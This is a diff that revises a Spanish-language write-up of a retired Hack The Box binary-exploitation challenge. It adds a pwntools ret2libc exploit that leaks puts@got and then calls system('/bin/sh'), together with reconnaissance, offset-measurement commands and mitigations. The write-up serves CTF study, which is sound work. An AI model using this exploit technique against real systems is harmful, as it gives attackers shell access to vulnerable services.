@@ -4,7 +4,7 @@ type: Pwn
 difficulty: Easy
 platform: Hack The Box
 state: Retired
-tags: [pwn, buffer-overflow, rop, pwntools, elf]
+tags: [pwn, buffer-overflow, rop, ret2libc, got-leak, pwntools]
 ---
 
 
@@ -14,65 +14,78 @@ tags: [pwn, buffer-overflow, rop, pwntools, elf]
 
 ## TL;DR
 
-- Ver las secciones adyacentes para el detalle.
+- El binario lee la entrada en un buffer de pila sin comprobar la longitud: el desbordamiento llega hasta `RIP`.
+- `checksec`: NX activo, sin canario y **sin PIE**, así que las direcciones del binario son fijas y el ataque es ROP.
+- Etapa 1: `pop rdi; ret` → `puts@got` → `puts@plt` → `main`, para filtrar la dirección real de `puts` y calcular la base de libc.
+- Etapa 2: con libc resuelta, `system("/bin/sh")` mediante `pop rdi; ret` y un `ret` de alineación.
 
 ## Enunciado y superficie
 
-Binario ELF con un `read()` que escribe más de lo que cabe en el buffer. Sin canario aparente y con una función que ya llama a `system`. El objetivo es controlar `RIP` y encadenar un ROP mínimo.
+ELF de 64 bits que pide una cadena por entrada estándar y la guarda en un buffer local. No hay canario y el binario no es PIE; NX impide ejecutar shellcode en la pila. El objetivo es controlar `RIP` y encadenar ROP hasta una shell.
 
 ## Reconocimiento
 
 ```bash
 file ropme; checksec --file=ropme
-objdump -d ropme | grep -E "<(main|system|win|vuln)>"
+objdump -d ropme | grep -E "<(main|vuln|system|puts)>"
 strings -a ropme | grep -E "/bin/sh|flag"
 ```
 
-`checksec` dice si hay NX, PIE y canario. Si PIE está desactivado, las direcciones del binario son fijas; con NX hay que usar ROP, no shellcode.
+`checksec` devuelve el escenario exacto del reto: `Canary: ✘`, `NX: ✓`, `PIE: ✘`, `RelRO: Partial`. Sin PIE se puede usar `elf.got` y `elf.plt` tal cual; con NX no hay shellcode, solo cadenas de gadgets.
 
 ## Análisis del código
 
-- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».
+La función principal reserva un buffer pequeño y llama a la lectura con un tamaño mayor, sin comprobar el retorno. Al no haber canario, los bytes que sobran sobrescriben el RBP guardado y la dirección de retorno: el desbordamiento es directo y determinista.
 
 ## Explicación del fallo
 
+El offset hasta `RIP` se mide con un patrón cíclico (en este binario son 72 bytes: 0x40 de buffer más 8 del RBP guardado, pero se comprueba siempre):
+
 ```bash
 python3 -c "from pwn import *; print(cyclic(200))" > pat
-./ropme < pat          # o enviarlo por el socket
+./ropme < pat
 dmesg | tail -3        # RIP = 0x616161...
 python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
 ```
 
-Con `gdb` y `pwndbg`: `pattern create 200`, luego `pattern offset $rsp`.
+Con `gdb` + `pwndbg`: `pattern create 200` y `pattern offset $rsp` en el crash.
 
 ## Reproducción local
 
-- Ejecuta el binario en local con la misma libc y depura con `gdb`/`pwndbg`.
-- Compara el offset local con el del servicio remoto antes de lanzar el exploit.
+- Ejecutar el binario con la libc del reto (`ldd ./ropme`) y depurar el crash en `gdb`/`pwndbg`.
+- Repetir el offset y el leak contra el servicio remoto antes de lanzar el exploit definitivo.
 
 ## Explotación
 
-Se necesita `pop rdi; ret` para pasar `/bin/sh` a `system`:
+La cadena tiene dos etapas porque libc tiene ASLR: no se conoce la dirección de `system` hasta filtrar una.
+
+1. **Leak**: `pop rdi; ret` → dirección de `puts@got` → `puts@plt` imprime el puntero real de `puts` en libc → `main` vuelve a pedir entrada.
+2. **ret2libc**: `base_libc = puts_leak - libc.symbols['puts']`; después `pop rdi; ret` → `next(libc.search(b'/bin/sh'))` → `libc.symbols['system']`, con un `ret` extra para alinear la pila a 16 bytes.
 
 ```bash
-ROPgadget --binary ropme | grep "pop rdi"
-objdump -d ropme | grep "<system@plt>"
+ROPgadget --binary ropme | grep -E "pop rdi|: ret$"
+objdump -d ropme | grep -E "<(puts|main)@plt>"
 ```
 
 ```python
 from pwn import *
 context.binary = elf = ELF('./ropme')
-p = process('./ropme')          # o remote('<IP>', <PORT>)
-p.sendline(flat({
-    0: b'A'*<offset>,
-    <offset>: p64(elf.symbols.get('pop_rdi', <POP_RDI>)),
-    <offset+8>: p64(next(elf.search(b'/bin/sh'))),
-    <offset+16>: p64(elf.plt['system']),
-}))
+libc = ELF('./libc.so.6')          # la que entregue el reto
+p = process('./ropme')             # o remote('<IP>', <PORT>)
+
+pop_rdi = <POP_RDI>
+ret     = <RET>
+
+# etapa 1: filtrar puts@got y volver a main
+p.sendline(flat({<offset>: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main']]}))
+puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = puts_leak - libc.symbols['puts']
+log.success(f'libc base: {hex(libc.address)}')
+
+# etapa 2: system('/bin/sh')
+p.sendline(flat({<offset>: [ret, pop_rdi, next(libc.search(b'/bin/sh')), libc.symbols['system']]}))
 p.interactive()
 ```
-
-Si no hay `/bin/sh` en el binario, se escribe en `.bss` con `gets`/`read` y se llama con `pop rdi`.
 
 ## Evidencia
 
@@ -81,21 +94,18 @@ Si no hay `/bin/sh` en el binario, se escribe en `.bss` con `gets`/`read` y se l
 
 ## Lecciones aprendidas
 
-- **`SIGSEGV` antes de llegar a `ret`** → el offset está mal; el buffer puede tener otro tamaño o hay alineación.
-- **`system` no ejecuta** → falta alinear la pila a 16 bytes; añade un `ret` antes del `pop rdi`.
-- **`/bin/sh` no existe** → escribe la cadena en `.bss` con `read` y usa su dirección.
-- **Funciona en local y no en remoto** → libc distinta; si el reto da la libc, calcula `system` con `libc.symbols`.
-
-- `checksec` decide la estrategia antes de escribir una línea de exploit.
-- El offset se mide, no se adivina.
-- La alineación de pila es la causa número uno de fallos intermitentes en ROP.
+- **No PIE + NX** deja el camino claro: ROP con direcciones del binario fijas y sin shellcode.
+- **`puts@got` es el leak canónico**: `puts@plt` imprime el contenido de su propia entrada GOT y revela la base de libc.
+- **`SIGSEGV` antes de `ret`** → offset mal medido; repite el patrón cíclico.
+- **`system` no ejecuta** → pila desalineada; añade un `ret` antes del `pop rdi` (fallo típico en `movaps`).
+- **Funciona en local y no en remoto** → libc distinta; usa la que entrega el reto y recalcula con `libc.symbols`.
 
 MITRE: T1203, T1059.
 
 ## Mitigaciones y detección
 
-- Aplicar la corrección de la categoría: validación en servidor, versiones parcheadas y mínimo privilegio.
-- Detección: revisar los logs de la aplicación y alertar de 4xx/5xx repetidos o entradas anómalas.
+- Compilar con `-fstack-protector-strong` y PIE, y limitar la lectura al tamaño real del buffer (`fgets(buf, sizeof buf, stdin)`).
+- Detección: crashes repetidos del proceso, patrones cíclicos en la entrada y retornos a `puts`/`system` fuera del flujo normal.
 
 ## Referencias
 
